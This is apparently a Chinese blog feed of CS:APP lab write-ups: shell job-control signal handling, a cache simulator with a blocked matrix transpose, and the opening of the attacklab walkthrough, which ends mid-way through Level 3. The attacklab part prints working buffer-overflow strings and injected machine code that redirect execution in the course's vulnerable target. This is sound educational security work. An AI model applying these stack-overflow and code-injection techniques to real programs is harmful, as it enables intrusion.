+大体意思就是在Unix shell上运行我们自己的shell时，需要在创建出一个子进程之后调用<code>setpgid(0, 0)</code> 将他们放到一个新的进程组，否则我们的<code>ctrl-c</code> 与<code>ctrl-z</code> 会把信号发送到包括我们的shell在内的全部进程中，就是因为没注意这个使得我的shell产生的很多迷幻的错误，以至于调试很久却不知道原因（其实只能怪自己没认真看手册）。</p>
+<h2 id="waitfg"><code>waitfg()</code></h2>
+<p>对于waitfg()函数，我想过几个实行方案：</p>
+<h3 id="waitfg1"><code>waitfg1()</code></h3>
+<pre><code class="language-c"># This is a buggy code.
+void waitfg(pid_t pid)
+{
+    int status;
+    if (waitpid(pid,&amp;status,0) &lt; 0)
+        unix_error(&quot;waitfg: waitpid error
+&quot;);
+    printf(&quot;wait %d ok
+&quot;,pid);
+    return;
+}
+
+void sigchld_handler(int sig)
+{
+    pid_t pid;  
+    int old_errno = errno;
+    while ((pid = waitpid(-1, NULL, 0)) &gt; 0) //这里必须是while，书上讲的很明白了
+	    printf(&quot;Handler reaped child %d
+&quot;, (int)pid);
+    if (errno != ECHILD)
+	    unix_error(&quot;waitpid error&quot;);
+    errno = old_errno;
+    return;
+}
+</code></pre>
+<p>代码是之前的，省略了一些不相关的细节。<br>
+我们直接在<code>waitfg</code>里面调用 <code>waitpid</code> 函数，但是这样做有个很明显的问题，就是在回收后台进程时，如果在<code>sigchld_handler</code> 函数的执行阶段前台进程结束了，会被一并回收掉，从而导致<code>waitfg</code> 中的<code>waitpid</code> 回收不到前台进程，从而产生一个错误。</p>
+<h3 id="waitfg2"><code>waitfg2()</code></h3>
+<pre><code class="language-c"># This is a buggy code.
+void waitfg(pid_t pid)
+{
+    int status;
+    sigset_t mask_chld,pre_mask;
+    sigemptyset(&amp;mask_chld);
+    sigaddset(&amp;mask_chld,SIGCHLD);
+    sigprocmask(SIG_SETMASK,&amp;mask_chld,&amp;pre_mask);
+    if (waitpid(pid,&amp;status,0) &lt; 0)
+        unix_error(&quot;waitfg: waitpid error
+&quot;);
+    printf(&quot;wait %d ok
+&quot;,pid);
+    sigprocmask(SIG_SETMASK,&amp;pre_mask,NULL);
+    return;
+}
+</code></pre>
+<p>加入我们再waitfg中加入对SIGCHLD信号的阻塞，这样可以保证前台进程能被正确回收，但是问题在于我们执行前台进程时不会处理SIGCHLD信号，这样子进程就不能被回收，如果前台进程一直运行，就会导致后台进程退出后全部变成僵死进程，浪费系统资源。<br>
+所以我们最终还是要按照书上的思路来实现</p>
+<h3 id="waitfg-2"><code>waitfg()</code></h3>
+<pre><code class="language-c">void waitfg(pid_t pid)
+{
+    sigset_t mask_empty, mask_all, mask_pre;
+    sigemptyset(&amp;mask_empty);
+    sigfillset(&amp;mask_all);
+    sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;mask_pre); //fgpid涉及全局变量的访问
+    while (pid == fgpid(jobs))
+        sigsuspend(&amp;mask_empty);
+    sigprocmask(SIG_SETMASK, &amp;mask_pre, NULL);
+    return;
+}
+</code></pre>
+<h2 id="sigchld_handler"><code>sigchld_handler()</code></h2>
+<pre><code class="language-c">void sigchld_handler(int sig)
+{
+    pid_t pid;
+    int status;
+    int old_errno = errno;
+    sigset_t mask_empty, mask_all, mask_pre;
+    sigemptyset(&amp;mask_empty);
+    sigfillset(&amp;mask_all);
+    while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0)
+    {
+        sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;mask_pre);
+        if (WIFSTOPPED(status)) //暂停
+        {
+            struct job_t *job = getjobpid(jobs, pid);
+            job-&gt;state = ST;
+            printf(&quot;Job [%d] (%d) stopped by signal %d
+&quot;,job-&gt;jid, pid, WSTOPSIG(status));
+        }
+        else
+        {
+            if (WIFSIGNALED(status)) //被信号退出
+            {
+                struct job_t *job = getjobpid(jobs, pid);
+                printf(&quot;Job [%d] (%d) terminated by signal %d
+&quot;, job-&gt;jid, job-&gt;pid, WTERMSIG(status));
+            } 
+            deletejob(jobs, pid);
+        }
+        sigprocmask(SIG_SETMASK, &amp;mask_pre, NULL);
+    }
+    errno = old_errno;
+    return;
+}
+</code></pre>
+<p>有了前面的基础，这个函数也很简单了。</p>
+<h2 id="sigint_handler-与-sigtstp_handler"><code>sigint_handler() 与 sigtstp_handler()</code></h2>
+<pre><code class="language-c">void sigint_handler(int sig)
+{
+    pid_t pid;
+    int old_errno = errno;
+    if ((pid = fgpid(jobs)) != 0)
+    {
+        kill(-pid, SIGINT);
+    }
+    errno = old_errno;
+    return;
+}
+
+void sigtstp_handler(int sig)
+{
+    pid_t pid;
+    int old_errno = errno;
+    pid = fgpid(jobs);
+    if (pid)
+    {
+        kill(-pid, sig);
+    }
+    errno = old_errno;
+    return;
+}
+</code></pre>
+<p>这两个也很简单</p>
+<h2 id="builtin_cmd"><code>builtin_cmd()</code></h2>
+<pre><code class="language-c">int builtin_cmd(char **argv)
+{
+    if (!strcmp(argv[0], &quot;quit&quot;))
+        exit(0);
+    else if (!strcmp(argv[0], &quot;jobs&quot;))
+    {
+        listjobs(jobs);
+        return 1;
+    }
+    else if (!strcmp(argv[0], &quot;bg&quot;) || !strcmp(argv[0], &quot;fg&quot;))
+    {
+        do_bgfg(argv);
+        return 1;
+    }
+    return 0; /* not a builtin command */
+}
+</code></pre>
+<p>这个函数与书上的几乎无异。</p>
+<h2 id="do_bgfg"><code>do_bgfg()</code></h2>
+<pre><code class="language-c">void do_bgfg(char **argv)
+{
+    struct job_t *job;
+    if(argv[1] == NULL){
+        printf(&quot;%s command requires PID or %%jobid argument
+&quot;,argv[0]);
+        return;
+    }
+    char * idstring = argv[1];
+    int isjid = 0;
+    int id;
+    if(idstring[0]=='%'){   //以jobid作为目标
+        isjid = 1;
+        id = atoi(idstring+1);
+        if(!id){
+            printf(&quot;%s: argument must be a PID or %%jobid
+&quot;,argv[0]);
+            return;
+        }
+    }
+    else{   //以pid作为目标
+        id = atoi(idstring);
+        if(!id){
+            printf(&quot;%s: argument must be a PID or %%jobid
+&quot;,argv[0]);
+            return;
+        }
+    }
+    sigset_t mask_empty, mask_all, mask_pre;
+    sigemptyset(&amp;mask_empty);
+    sigfillset(&amp;mask_all);
+    sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;mask_pre); //与job相关操作涉及全局变量的访问
+    if (isjid)  //寻找目标job
+    {
+        job = getjobjid(jobs, id);
+        if (!job){
+            printf(&quot;%%%d: No such job
+&quot;, id);
+            sigprocmask(SIG_SETMASK, &amp;mask_pre, NULL);
+            return;
+        }
+    }
+    else 
+    {
+        job = getjobpid(jobs, id);
+        if (!job){
+            printf(&quot;(%d): No such process
+&quot;, id);
+            sigprocmask(SIG_SETMASK, &amp;mask_pre, NULL);
+            return;
+        }
+    }
+    pid_t pid = job-&gt;pid;
+    if (!strcmp(argv[0], &quot;bg&quot;)) //bg fg切换
+    {
+        job-&gt;state = BG;
+        printf(&quot;[%d] (%d) %s&quot;,job-&gt;jid,job-&gt;pid,job-&gt;cmdline);
+        kill(-pid, SIGCONT);
+    }
+    else if (!strcmp(argv[0], &quot;fg&quot;))
+    {
+        job-&gt;state = FG;
+        kill(-pid, SIGCONT);
+        sigprocmask(SIG_SETMASK, &amp;mask_pre, NULL);
+        waitfg(pid);
+        return;
+    }
+    sigprocmask(SIG_SETMASK, &amp;mask_pre, NULL);
+    return;
+}
+</code></pre>
+<p>主要是要对参数是否符合要求进行判断。</p>
+<h2 id="完整代码">完整代码</h2>
+<p><a href="http://static.yulan.net.cn/image/csapp_shelllab.c">tsh.c</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: cachelab]]></title>
+        <id>https://yulangz.github.io/post/uscxh7_mezrog/</id>
+        <link href="https://yulangz.github.io/post/uscxh7_mezrog/">
+        </link>
+        <updated>2021-08-06T05:41:41.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p><a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">实验手册</a>：包含了实验指导和评分规则<br>
+<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">实验ppt</a>对上课内容的回顾和对实验细节的讲解，很值得一看</p>
+</blockquote>
+<h2 id="part-a">Part A</h2>
+<p>这一部分是要实现一个cache模拟器，需要记录命中次数，不命中次数和替换次数，通过这个可以让我们更加了解cache的运行方式，同时也可以更加了解LRU的替换策略。<br>
+这一部分需要了解的两个函数<code>getopt()</code> 和 <code>fscanf()</code> 在开头的<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">ppt</a>中有讲解。</p>
+<h3 id="先上代码">先上代码</h3>
+<pre><code class="language-c">#include &quot;cachelab.h&quot;
+#include &lt;unistd.h&gt;
+#include &lt;getopt.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int h, v, s, S, E, b, B;    //定义全局变量方便调用
+char t[200];
+int hits, misses, evictions;
+long stempnow = 0;
+typedef struct
+{
+    int valid;  //有效位
+    int tag;    //标记位
+    long LRU_stemp; //LRU替换的标记
+} cacheline, *cache_set, **_cache;
+_cache cache;
+
+//这一部分是为了实现-v下的回显，最终的测试并不要求这个
+typedef int result_tag;
+#define MISS 0
+#define HIT 1
+#define EVICTION 2
+
+
+void printUsage();  //-h打印使用方法
+void init_cache();  //初始化cache
+void close_cache(); //free掉cache
+void printverbose(char oper, unsigned int address, int size, char *opresult);  //-v下打印回显
+void do_trace();  //解析trace并以此执行
+result_tag access_cache(char oper, unsigned int address, int size); //访问cache
+
+int main(int argc, char **argv)
+{
+
+    int opt;
+    while (-1 != (opt = (getopt(argc, argv, &quot;hvs:E:b:t:&quot;))))
+    {
+        switch (opt)
+        {
+        case 'h':
+            h = 1;
+            printUsage();
+            break;
+        case 'v':
+            v = 1;
+            break;
+        case 's':
+            s = atoi(optarg);
+            break;
+        case 'E':
+            E = atoi(optarg);
+            break;
+        case 'b':
+            b = atoi(optarg);
+            break;
+        case 't':
+            strcpy(t, optarg);
+            break;
+        default:
+            printUsage();
+            break;
+        }
+    }
+    if (s &lt;= 0 || E &lt;= 0 || b &lt;= 0 || t == NULL) // 如果选项参数不合格就退出
+        return -1;
+    S = 1 &lt;&lt; s;
+    B = 1 &lt;&lt; b;
+    init_cache();
+    do_trace();
+    close_cache();
+    printSummary(hits, misses, evictions);
+    return 0;
+}
+
+void printUsage()
+{
+    printf(&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;
+&quot;
+           &quot;Options:
+&quot;
+           &quot;  -h         Print this help message.
+&quot;
+           &quot;  -v         Optional verbose flag.
+&quot;
+           &quot;  -s &lt;num&gt;   Number of set index bits.
+&quot;
+           &quot;  -E &lt;num&gt;   Number of lines per set.
+&quot;
+           &quot;  -b &lt;num&gt;   Number of block offset bits.
+&quot;
+           &quot;  -t &lt;file&gt;  Trace file.
+
+&quot;
+           &quot;Examples:
+&quot;
+           &quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace
+&quot;
+           &quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace
+&quot;);
+}
+
+void init_cache()
+{
+    cache = (_cache)malloc(sizeof(cache_set) * S);
+    int i, j;
+    for (i = 0; i &lt; S; i++)
+    {
+        cache[i] = (cache_set)malloc(sizeof(cacheline) * E);
+        for (j = 0; j &lt; E; j++)
+        {
+            cache[i][j].tag = 0;
+            cache[i][j].valid = 0;
+            cache[i][j].LRU_stemp = 0;
+        }
+    }
+}
+
+void close_cache()
+{
+    int i;
+    for (i = 0; i &lt; S; i++)
+        free(cache[i]);
+    free(cache);
+}
+
+void printverbose(char oper, unsigned int address, int size, char *opresult)
+{
+    printf(&quot;%c %x,%d %s
+&quot;, oper, address, size, opresult);
+}
+
+void do_trace()
+{
+    FILE *fp = fopen(t, &quot;r&quot;); // 读取文件
+    if (fp == NULL)
+    {
+        printf(&quot;open error&quot;);
+        exit(-1);
+    }
+
+    char operation;       // 命令开头的 I L M S
+    unsigned int address; // 地址参数
+    int size;             // 大小
+    while (fscanf(fp, &quot; %c %xu,%d
+&quot;, &amp;operation, &amp;address, &amp;size) &gt; 0)
+    {
+        size = 1;
+        result_tag r;
+        switch (operation)
+        {
+        case 'I':
+            break;
+        case 'L':
+            r = access_cache(operation, address, size);
+            if (v)
+            {
+                if (r == HIT)
+                    printverbose(operation, address, size, &quot;hit&quot;);
+                else if (r == MISS)
+                    printverbose(operation, address, size, &quot;miss&quot;);
+                else if (r == EVICTION)
+                    printverbose(operation, address, size, &quot;miss eviction&quot;);
+            }
+            break;
+        case 'S':
+            r = access_cache(operation, address, size);
+            if (v)
+            {
+                if (r == HIT)
+                    printverbose(operation, address, size, &quot;hit&quot;);
+                else if (r == MISS)
+                    printverbose(operation, address, size, &quot;miss&quot;);
+                else if (r == EVICTION)
+                    printverbose(operation, address, size, &quot;miss eviction&quot;);
+            }
+            break;
+        case 'M':
+            r = access_cache(operation, address, size);
+            hits++;         //M的第二次一定命中
+            if (v)
+            {
+                if (r == HIT)
+                    printverbose(operation, address, size, &quot;hit hit&quot;);
+                else if (r == MISS)
+                    printverbose(operation, address, size, &quot;miss hit&quot;);
+                else if (r == EVICTION)
+                    printverbose(operation, address, size, &quot;miss eviction hit&quot;);
+            }
+            break;
+        }
+    }
+    fclose(fp);
+}
+
+result_tag access_cache(char oper, unsigned int address, int size)
+{
+    int access_tag, access_set;
+    int tag_mask, set_mask;
+    set_mask = ((1 &lt;&lt; (b + s)) - 1) - ((1 &lt;&lt; b) - 1); //组号掩码
+    access_set = ((set_mask &amp; address) &gt;&gt; b) % S;     //组号
+    tag_mask = -1 &lt;&lt; (b + s);                //tag的掩码
+    access_tag = tag_mask &amp; address;         //tag值 
+    int i;
+    for (i = 0; i &lt; E; i++)
+    {
+        if (cache[access_set][i].valid &amp;&amp; cache[access_set][i].tag == access_tag) //命中
+        {
+            hits++;
+            cache[access_set][i].LRU_stemp = stempnow++;
+            return HIT;
+        }
+    }
+
+    for (i = 0; i &lt; E; i++)
+    {
+        if (!cache[access_set][i].valid) //未命中找到空行
+        {
+            cache[access_set][i].valid = 1;
+            cache[access_set][i].tag = access_tag;
+            cache[access_set][i].LRU_stemp = stempnow++;
+            misses++;
+            return MISS;
+        }
+    }
+
+    //未命中且需要进行行替换
+    //寻找时间戳最小（最少最近使用）的行
+    int eviction_line = 0;
+    long maxstemp = ~((long)1 &lt;&lt; 63);
+    for (i = 0; i &lt; E; i++)
+    {
+        if (cache[access_set][i].LRU_stemp &lt; maxstemp)
+        {
+            eviction_line = i;
+            maxstemp = cache[access_set][i].LRU_stemp;
+        }
+    }
+    //行替换
+    cache[access_set][eviction_line].valid = 1;
+    cache[access_set][eviction_line].tag = access_tag;
+    cache[access_set][eviction_line].LRU_stemp = stempnow++;
+    misses++;
+    evictions++;
+    return EVICTION;
+}
+</code></pre>
+<p>为了实现LRU的替换策略，我的方法是维持一个stempnow的自建时间戳，每次对行有更新时就讲这个时间戳记录进去，同时时间戳自加1，这样替换时就只需要寻找时间戳最小的那一行替换就行。<br>
+这一部分总体上不难，主要困难在于理解cache的工作方式和设计如何去提取出组号与tag值。</p>
+<h2 id="part-b">Part B</h2>
+<p>这一部分需要我们实现矩阵的转置，要求尽可能地利用cache，即减少miss，总共有三道题。</p>
+<h3 id="3232">32*32</h3>
+<p>我们首先看一下示例的蛮力法<br>
+<img src="http://static.yulan.net.cn/image/_8db52d3dc29d6cd32b26b3a02bfc52b5.png" alt="" loading="lazy"><br>
+miss高达1183，远大于300的目标。<br>
+我们知道的是cache 大小为 s=5,E=1,b=5,即32组_1行_32字节，共256个int。<br>
+所以我们需要对矩阵进行分块，我们在转置的过程中尽量让块小于cache大小，因为cache可以装256个int，所以块大小定为8*8。<br>
+（这一步的代码没保存，就不贴了）<br>
+结果是<br>
+<img src="http://static.yulan.net.cn/image/_cbdf4366e62a6c8c3e7a4e59490e533c.png" alt="" loading="lazy"><br>
+仍没达到要求。<br>
+下一步我选择每次把每一行的8个数一次性读取，然后再一次性存到矩阵B中，这样可以进一步减少cache的替换，从而减少miss。</p>
+<pre><code class="language-c">if (M == 32)
+    {
+        int i, j, block_i;
+        int t0, t1, t2, t3, t4, t5, t6, t7;
+        for (i = 0; i &lt; N; i += 8)
+        {
+            for (j = 0; j &lt; M; j += 8)
+            {
+                for (block_i = 0; block_i &lt; 8; block_i++)
+                {
+                    t0 = A[i + block_i][j + 0];
+                    t1 = A[i + block_i][j + 1];
+                    t2 = A[i + block_i][j + 2];
+                    t3 = A[i + block_i][j + 3];
+                    t4 = A[i + block_i][j + 4];
+                    t5 = A[i + block_i][j + 5];
+                    t6 = A[i + block_i][j + 6];
+                    t7 = A[i + block_i][j + 7];
+                    B[j + 0][i + block_i] = t0;
+                    B[j + 1][i + block_i] = t1;
+                    B[j + 2][i + block_i] = t2;
+                    B[j + 3][i + block_i] = t3;
+                    B[j + 4][i + block_i] = t4;
+                    B[j + 5][i + block_i] = t5;
+                    B[j + 6][i + block_i] = t6;
+                    B[j + 7][i + block_i] = t7;
+                }
+            }
+        }
+    }
+</code></pre>
+<p>结果是<br>
+<img src="http://static.yulan.net.cn/image/_56c0dd079d3aca587e6d23ed1df3443d.png" alt="" loading="lazy"><br>
+终于通过了</p>
+<h3 id="6464">64*64</h3>
+<p>这是最难的一部分，因为整个cache只能存储数组的四行，所以如果按照8_8分块的话仍然有很高的冲突，然而这一题要求有十分严苛，只能1300，所以需要更精细的方法，先按照8_8分块，在块内在按照4*4划分，同时不追求一次到位，而要求最高的cache重复访问，详细解析可以参考<a href="https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&amp;utm_medium=referral">这篇博客</a><br>
+<strong>代码：</strong></p>
+<pre><code class="language-c">else if (N == 64)
+    {
+        for (int i = 0; i &lt; N; i += 8)
+        {
+            for (int j = 0; j &lt; M; j += 8)
+            {
+                for (int k = i; k &lt; i + 4; ++k)
+                {
+                    /* 读取1 2，暂时放在左下角1 2 */
+                    int temp_value0 = A[k][j];
+                    int temp_value1 = A[k][j + 1];
+                    int temp_value2 = A[k][j + 2];
+                    int temp_value3 = A[k][j + 3];
+                    int temp_value4 = A[k][j + 4];
+                    int temp_value5 = A[k][j + 5];
+                    int temp_value6 = A[k][j + 6];
+                    int temp_value7 = A[k][j + 7];
+
+                    B[j][k] = temp_value0;
+                    B[j + 1][k] = temp_value1;
+                    B[j + 2][k] = temp_value2;
+                    B[j + 3][k] = temp_value3;
+                    /* 逆序放置 */
+                    B[j][k + 4] = temp_value7;
+                    B[j + 1][k + 4] = temp_value6;
+                    B[j + 2][k + 4] = temp_value5;
+                    B[j + 3][k + 4] = temp_value4;
+                }
+                for (int l = 0; l &lt; 4; ++l)
+                {
+                    /* 按列读取 */
+                    int temp_value0 = A[i + 4][j + 3 - l];
+                    int temp_value1 = A[i + 5][j + 3 - l];
+                    int temp_value2 = A[i + 6][j + 3 - l];
+                    int temp_value3 = A[i + 7][j + 3 - l];
+                    int temp_value4 = A[i + 4][j + 4 + l];
+                    int temp_value5 = A[i + 5][j + 4 + l];
+                    int temp_value6 = A[i + 6][j + 4 + l];
+                    int temp_value7 = A[i + 7][j + 4 + l];
+
+                    /* 从下向上按行转换2到3 */
+                    B[j + 4 + l][i] = B[j + 3 - l][i + 4];
+                    B[j + 4 + l][i + 1] = B[j + 3 - l][i + 5];
+                    B[j + 4 + l][i + 2] = B[j + 3 - l][i + 6];
+                    B[j + 4 + l][i + 3] = B[j + 3 - l][i + 7];
+                    /* 将3 4放到正确的位置 */
+                    B[j + 3 - l][i + 4] = temp_value0;
+                    B[j + 3 - l][i + 5] = temp_value1;
+                    B[j + 3 - l][i + 6] = temp_value2;
+                    B[j + 3 - l][i + 7] = temp_value3;
+                    B[j + 4 + l][i + 4] = temp_value4;
+                    B[j + 4 + l][i + 5] = temp_value5;
+                    B[j + 4 + l][i + 6] = temp_value6;
+                    B[j + 4 + l][i + 7] = temp_value7;
+                }
+            }
+        }
+    }
+</code></pre>
+<p>结果<br>
+<img src="http://static.yulan.net.cn/image/_ffb263a782f4a0423e7194043f170ae6.png" alt="" loading="lazy"><br>
+像这样进行专门的优化，确实可以极大地提高cache的利用率，从而提高程序的效率，但是其缺点也很明显，只能针对专门的矩阵进行优化，不具有普适性，就像我们即将看到的第三题。</p>
+<h3 id="6167">61*67</h3>
+<p>这一题由于矩阵没有什么特别的规律，所以不清楚在cache的映射情况，因此我们只能一步步地尝试分块的大小，最终发现大约在14*14时可以满足题目要求。</p>
+<pre><code class="language-c">else
+    { //没有什么特征，只能试块大小，在14的时候misses为1996，通过了
+        int block_size = 14;
+        int i, j, bl_i, bl_j;
+        for (i = 0; i &lt; N; i += block_size)
+            for (j = 0; j &lt; M; j += block_size)
+                for (bl_i = 0; bl_i &lt; block_size &amp;&amp; bl_i + i &lt; N; bl_i++)
+                    for (bl_j = 0; bl_j &lt; block_size &amp;&amp; bl_j + j &lt; M; bl_j++)
+                        B[j + bl_j][i + bl_i] = A[i + bl_i][j + bl_j];
+    }
+</code></pre>
+<h3 id="满分合影">满分合影</h3>
+<figure data-type="image" tabindex="1"><img src="http://static.yulan.net.cn/image/_b4661e2b2a55344639f67be2127d2350.png" alt="" loading="lazy"></figure>
+<h3 id="完整代码">完整代码</h3>
+<ul>
+<li><a href="http://static.yulan.net.cn/image/csapp_cachelab_parta.c">Part a</a></li>
+<li><a href="http://static.yulan.net.cn/image/csapp_cachelab_partb.c">Part b</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: Attacklab]]></title>
+        <id>https://yulangz.github.io/post/uscxh7_ainkg2/</id>
+        <link href="https://yulangz.github.io/post/uscxh7_ainkg2/">
+        </link>
+        <updated>2021-08-06T05:35:26.000Z</updated>
+        <content type="html"><![CDATA[<p>这个实验要求在5个有不同安全漏洞的代码上进行攻击(一开始我还以为是要修复漏洞...)，总共有两种攻击方式：</p>
+<ul>
+<li>Code Injection Attacks（缓冲区溢出攻击）</li>
+<li>Return-Oriented Programming（ROP攻击）</li>
+</ul>
+<p>从CSAPP网站下载下来解压后一共有五个文件：</p>
+<ul>
+<li><code>ctarget</code>：一个容易遭受code injection攻击的可执行程序。</li>
+<li><code>rtarget</code>：一个容易遭受return-oriented programming攻击的可执行程序。</li>
+<li><code>cookie.txt</code>：一个8位的十六进制码，用于验证身份的唯一标识符。</li>
+<li><code>farm.c</code>：目标“gadget farm”的源代码，用于产生return-oriented programming攻击。</li>
+<li><code>hex2raw</code>：一个生成攻击字符串的工具。</li>
+</ul>
+<p>实验之前一定要阅读<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">指导手册</a>，还有<a href="http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf">GDB指南</a>，对实验很有帮助。</p>
+<h2 id="level1">Level1</h2>
+<p>要求我们输入一段字符串，通过缓冲区溢出改变函数的返回地址，定向到 <code>touch1</code> 函数<br>
+首先看看 <code>test</code> 函数：</p>
+<pre><code>0000000000401968 &lt;test&gt;:
+  401968:	48 83 ec 08          	sub    $0x8,%rsp
+  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
+  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;
+  401976:	89 c2                	mov    %eax,%edx
+  401978:	be 88 31 40 00       	mov    $0x403188,%esi
+  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
+  401982:	b8 00 00 00 00       	mov    $0x0,%eax
+  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
+  40198c:	48 83 c4 08          	add    $0x8,%rsp
+  401990:	c3                   	retq
+</code></pre>
+<p>没有什么特别之处<br>
+我们再看下 <code>getbuf</code> 函数：</p>
+<pre><code>00000000004017a8 &lt;getbuf&gt;:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq
+</code></pre>
+<p>首先创建一个 40 个字节的缓冲区( <code>0x28=40</code> )，然后通过Gets函数读取一个字符串到缓冲区。<br>
+我们先来查看一下stack的状态：</p>
+<pre><code>(gdb) x/60b $rsp
+0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
+0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dcb0:     0x24    0x1f    0x40    0x00
+</code></pre>
+<p>可以看到距离 <code>%rsp</code> 的第41,42,43字节处有一个值 <code>761940</code> ，猜测这是一个返回地址，Ctrl+F查找<br>
+然而<br>
+<img src="http://static.yulan.net.cn/image/_0da3636d63a59ddbf940c5191d99cf0e.png" alt="" loading="lazy"><br>
+忽然想起小端序的问题，所以这个地址应该是 <code>401976</code><br>
+<img src="http://static.yulan.net.cn/image/_65725cc8a986fa6dbca8525ef2087c08.png" alt="" loading="lazy"><br>
+就是getbuf函数后一条指令的位置。<br>
+所以我们只需要通过缓冲区溢出来改变这个指令地址即可。</p>
+<h3 id="查看touch1的地址">查看touch1的地址</h3>
+<pre><code>00000000004017c0 &lt;touch1&gt;:
+  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
+</code></pre>
+<h3 id="构造我们的输入字符串">构造我们的输入字符串</h3>
+<pre><code>11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40
+</code></pre>
+<p>前40位不重要</p>
+<h3 id="通过hex2raw生成攻击字符串并执行">通过hex2raw生成攻击字符串并执行</h3>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./hex2raw &lt; exploit1.txt &gt; exploit1-raw.txt
+ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit1-raw.txt 
+Cookie: 0x59b997fa
+Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40
+</code></pre>
+<p>通过！！！</p>
+<h2 id="level2">Level2</h2>
+<p>这一关要我们从test跳转到另外一个函数 <code>touch2</code> ，同时将我们自己的cookie作为参数传给 <code>touch2</code> ，这个参数默认应该在%rdi中。<br>
+这一关我们不仅要修改跳转地址，还要插入一段代码进去执行，我们可以把这段代码插在缓冲区之中，然后将返回地址修改为我们代码的地址，并我们的代码中加入ret指令，使他最后返回到 <code>touch2</code> 的入口</p>
+<h3 id="我们需要插入的代码">我们需要插入的代码</h3>
+<pre><code>mov $0x59b997fa,%rdi
+pushq $0x4017ec
+retq
+</code></pre>
+<p>很简单，只用将cookie保存到%rdi，然后重新指定 <code>touch2</code> 的地址为返回地址即可<br>
+使用gcc与objdump生成机器指令</p>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ gcc -c asscode.s
+ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o
+
+asscode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 ec 17 40 00          pushq  $0x4017ec
+   c:   c3                      retq
+</code></pre>
+<p>把指令插在缓冲区</p>
+<pre><code>48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  78 dc 61 55
+</code></pre>
+<p>和level1一样，前面40个字节，后面是我们指定的返回地址，这里我们要将他指定为我们的代码插入的位置，也就是缓存区的起始地址。</p>
+<h4 id="通过gdb查看rep的值">通过gdb查看%rep的值</h4>
+<pre><code>(gdb) print $rsp
+$2 = (void *) 0x5561dc78
+</code></pre>
+<p>所以最后四个字节应该是 <code>78</code> <code>dc</code> <code>61</code> <code>55</code><br>
+最后和level1一样执行</p>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit2-raw.txt 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
+</code></pre>
+<h2 id="level3">Level3</h2>
+<p>这一关和level2差不多，只是这次传的参数是一个指针，其实差不多，我们先把cookie存在栈里面，然后把地址传给%rdi即可。<br>
